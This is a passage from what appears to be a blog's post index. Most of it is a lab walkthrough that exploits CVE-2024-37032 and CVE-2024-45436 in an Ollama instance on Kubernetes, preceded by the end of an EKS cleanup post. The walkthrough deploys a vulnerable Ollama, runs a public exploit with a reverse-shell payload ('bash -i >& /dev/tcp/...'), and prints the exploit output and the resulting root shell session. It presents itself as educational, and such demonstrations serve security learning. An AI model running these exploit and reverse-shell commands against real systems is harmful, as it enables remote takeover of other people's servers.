\"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Snapshots[].SnapshotId' --output text); do echo \"Removing Snapshot: ${SNAPSHOT}\" aws ec2 delete-snapshot --snapshot-id \"${SNAPSHOT}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms,cloudformation-karpenter,eksctl-${CLUSTER_NAME},helm_values-{aws-load-balancer-controller,cert-manager,external-dns,grafana,homepage,ingress-nginx,k8s-monitoring,karpenter,loki,mailpit,mimir-distributed,oauth2-proxy,pyroscope,tempo,velero},k8s-{karpenter-nodepool,scheduling-priorityclass,storage-snapshot-storageclass-volumesnapshotclass}}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"❌ File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy … 😉" }, { "title": "Exploiting RCE Vulnerabilities in Ollama on Kubernetes", "url": "/posts/ollama-k8s-exploitation/", "categories": "Kubernetes, Security", "tags": "kubernetes, security, genai", "date": "2025-07-10 00:00:00 +0200", "content": "Ollama has become a popular tool for running large language models locally. However, like any software, it can have vulnerabilities. This post provides a technical deep dive into two critical vulnerabilities: CVE-2024-37032 and CVE-2024-45436. These vulnerabilities allow for remote code execution (RCE) in older versions of Ollama. This demonstration is for educational purposes only. We will walk through a step-by-step demonstration of how an attacker could exploit these vulnerabilities in an Ollama instance running in a Kubernetes cluster. Understanding these attack vectors is crucial for building robust security postures. 📚 References: CVE-2024-37032 Detail CVE-2024-37032 &amp; CVE-2024-45436 Ollama RCE 🗺️ Architecture Diagram: sequenceDiagram participant Attacker (Kali Linux on EC2) participant Public Internet participant Ollama on EKS participant Ollama Container Attacker (Kali Linux on EC2)-&gt;&gt;+Public Internet: 1. Sends exploit request (CVE-2024-37032 &amp; CVE-2024-45436) Public Internet-&gt;&gt;+Ollama on EKS: 1. Forwards exploit request Ollama on EKS-&gt;&gt;+Ollama Container: 1. Receives malicious payload Ollama Container--&gt;&gt;-Ollama on EKS: 2. Initiates reverse shell connection Ollama on EKS--&gt;&gt;-Public Internet: 2. Forwards reverse shell Public Internet--&gt;&gt;-Attacker (Kali Linux on EC2): 2. Establishes reverse shell Note over Attacker (Kali Linux on EC2), Ollama Container: 3. Attacker gains interactive shell access to the container Prerequisites Before we begin, ensure you have the following tools installed and configured: AWS CLI with appropriate permissions to create resources. rain: A delightful CLI for AWS CloudFormation. helm: The package manager for Kubernetes. Environment Setup The following variables are used in the subsequent steps: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export AWS_EC2_KEY_PAIR_NAME=\"ollama-test\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" AWS EC2 instance with Kali Linux Launch an AWS EC2 instance with Kali Linux using a CloudFormation template. # Download the CloudFormation templates # renovate: currentValue=master wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/2a0cddbdf9bf15dce3faaaf33dc499e52db7423c/cfn/KaliLinux-NICE-DCV.yaml # Create a new AWS EC2 Key Pair to be used for the EC2 instance aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" # Deploy the VPC CloudFormation stack for the Kali Linux environment rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_KALI}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_KALI}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" # Extract VPC and Subnet IDs from the CloudFormation stack outputs AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") # Deploy the Kali Linux EC2 instance using the CloudFormation template rain deploy --yes --node-style original \"${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \"${SOLUTION_KALI}\" \\ --params \"ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No,allowWebServerPorts=HTTP-and-HTTPS\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" Configure SSH access to the Kali Linux instance: AWS_EC2_KALI_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Enabling Karpenter to Provision amd64 Node Pools To enable Karpenter to provision an amd64 node pool, create a new NodePool resource as shown below: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool-amd64.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default-amd64 spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default requirements: - key: kubernetes.io/arch operator: In values: [\"amd64\"] limits: cpu: 2 memory: 4Gi EOF Deploying Vulnerable Ollama Instance Install the ollama Helm chart and modify its default values to deploy a vulnerable version (0.1.33): OLLAMA_HELM_CHART_VERSION=\"1.23.0\" helm repo add otwld https://helm.otwld.com/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ollama.yml\" &lt;&lt; EOF image: tag: 0.1.33 ingress: enabled: true hosts: - host: ollama-vulnerable.${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ollama-vulnerable.${CLUSTER_FQDN} nodeSelector: kubernetes.io/arch: amd64 EOF helm upgrade --install --version \"${OLLAMA_HELM_CHART_VERSION}\" --namespace ollama --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ollama.yml\" ollama otwld/ollama Exploit Execution Now, let’s execute the exploit from the Kali Linux instance. AWS_EC2_KALI_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_PUBLIC_IP}\" &lt;&lt; EOF set -euxo pipefail # Install dependencies sudo apt update -qq &amp;&amp; sudo apt install -qqy golang-go ncat # Run ncat echo -e \"pwd \\n ps -elf \\n whoami\" | sudo ncat -lnvp 80 --idle-timeout 5 --output /tmp/ncat.log &amp; # Clone the exploit repository git clone https://github.com/pankass/CVE-2024-37032_CVE-2024-45436.git cd CVE-2024-37032_CVE-2024-45436 || exit # Run the exploit # The target is our vulnerable Ollama service. # The -exec payload will create a reverse shell back to our Kali instance. go run main.go -target \"https://ollama-vulnerable.${CLUSTER_FQDN}\" -exec \"bash -i &gt;&amp; /dev/tcp/${AWS_EC2_KALI_PUBLIC_IP}/80 0&gt;&amp;1\" EOF ... ... Vulnerability does exist!!! http log: http log: {\"status\":\"unpacking model metadata\"} {\"error\":\"couldn't determine model format\"} pulling model, please wait...... http log: {\"status\":\"pulling manifest\"} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":4161536} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":8585216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":10043392} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":15138816} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":19005440} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":23265280} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":26275840} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":28880896} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":33161216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":37093376} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":43012096} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"verifying sha256 digest\"} {\"status\":\"writing manifest\"} {\"status\":\"removing any unused layers\"} {\"status\":\"success\"} ... ... Review the results of the commands executed on the compromised container, as captured by ncat: ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_PUBLIC_IP}\" \"cat /tmp/ncat.log\" pwd ps -elf whoami bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@ollama-647f4bd9b6-2nzvm:/# pwd / root@ollama-647f4bd9b6-2nzvm:/# ps -elf F S UID PID PPID C PRI NI ADDR SZ WCHAN STIME TTY TIME CMD 4 S root 1 0 7 80 0 - 512099 futex_ 15:51 ? 00:00:06 /bin/ollama serve 0 S root 14 1 0 80 0 - 2501 do_wai 15:52 ? 00:00:00 /tmp/ollama2637438906/runners/cpu_avx2/ollama_llama_server --model /root/.ollama/models/blobs/sha256-797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662 --ctx-size 256 --batch-size 512 --embedding --log-disable --parallel 1 --port 42595 4 S root 15 14 0 80 0 - 723 do_wai 15:52 ? 00:00:00 sh -c bash -c 'bash -i &gt;&amp; /dev/tcp/50.16.37.101/80 0&gt;&amp;1' 4 S root 16 15 0 80 0 - 1091 do_wai 15:52 ? 00:00:00 bash -c bash -i &gt;&amp; /dev/tcp/50.16.37.101/80 0&gt;&amp;1 4 S root 17 16 0 80 0 - 1157 do_wai 15:52 ? 00:00:00 bash -i 4 R root 20 17 0 80 0 - 1766 - 15:52 ? 00:00:00 ps -elf root@ollama-647f4bd9b6-2nzvm:/# whoami root root@ollama-647f4bd9b6-2nzvm:/# exit View Ollama Pod Logs: kubectl logs -n ollama \"$(kubectl get pods -n ollama -o jsonpath='{.items[0].metadata.name}')\" Couldn't find '/root/.ollama/id_ed25519'. Generating new private key. Your new public key is: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKPJt8RLcfSPdRn0b1uWMsLOVoJHq+o761pxK56ehTdn time=2025-07-11T15:51:36.369Z level=INFO source=images.go:828 msg=\"total blobs: 0\" time=2025-07-11T15:51:36.369Z level=INFO source=images.go:835 msg=\"total unused blobs removed: 0\" time=2025-07-11T15:51:36.370Z level=INFO source=routes.go:1071 msg=\"Listening on [::]:11434 (version 0.1.33)\" llm_load_print_meta: model type = 22M llm_load_print_meta: model ftype = F16 llm_load_print_meta: model params = 22.57 M llm_load_print_meta: model size = 43.10 MiB (16.02 BPW) llm_load_print_meta: general.name = all-MiniLM-L6-v2 llm_load_print_meta: BOS token = 101 '[CLS]' llm_load_print_meta: EOS token = 102 '[SEP]' llm_load_print_meta: UNK token = 100 '[UNK]' llm_load_print_meta: SEP token = 102 '[SEP]' llm_load_print_meta: PAD token = 0 '[PAD]' llm_load_print_meta: CLS token = 101 '[CLS]' llm_load_print_meta: MASK token = 103 '[MASK]' llm_load_print_meta: LF token = 0 '[PAD]' llm_load_tensors: ggml ctx size = 0.05 MiB llm_load_tensors: CPU buffer size = 43.10 MiB ............................... llama_new_context_with_model: n_ctx = 256 llama_new_context_with_model: n_batch = 512 llama_new_context_with_model: n_ubatch = 512 llama_new_context_with_model: freq_base = 10000.0 llama_new_context_with_model: freq_scale = 1 llama_kv_cache_init: CPU KV buffer size = 2.25 MiB llama_new_context_with_model: KV self size = 2.25 MiB, K (f16): 1.12 MiB, V (f16): 1.12 MiB llama_new_context_with_model: CPU output buffer size = 0.00 MiB llama_new_context_with_model: CPU compute buffer size = 5.00 MiB llama_new_context_with_model: graph nodes = 221 llama_new_context_with_model: graph splits = 1 {\"function\":\"initialize\",\"level\":\"INFO\",\"line\":448,\"msg\":\"initializing slots\",\"n_slots\":1,\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"initialize\",\"level\":\"INFO\",\"line\":457,\"msg\":\"new slot\",\"n_ctx_slot\":256,\"slot_id\":0,\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"main\",\"level\":\"INFO\",\"line\":3067,\"msg\":\"model loaded\",\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"main\",\"hostname\":\"127.0.0.1\",\"level\":\"INFO\",\"line\":3270,\"msg\":\"HTTP server listening\",\"n_threads_http\":\"3\",\"port\":\"42595\",\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"update_slots\",\"level\":\"INFO\",\"line\":1581,\"msg\":\"all slots are idle and system prompt is empty, clear the KV cache\",\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"process_single_task\",\"level\":\"INFO\",\"line\":1509,\"msg\":\"slot data\",\"n_idle_slots\":1,\"n_processing_slots\":0,\"task_id\":0,\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"log_server_request\",\"level\":\"INFO\",\"line\":2737,\"method\":\"GET\",\"msg\":\"request\",\"params\":{},\"path\":\"/health\",\"remote_addr\":\"127.0.0.1\",\"remote_port\":45762,\"status\":200,\"tid\":\"139831757436480\",\"timestamp\":1752249176} [GIN] 2025/07/11 - 15:52:56 | 200 | 256.889485ms | 50.16.37.101 | POST \"/api/embeddings\" [GIN] 2025/07/11 - 15:52:58 | 200 | 19.515µs | 192.168.95.252 | GET \"/\" 🕹️ Recorded 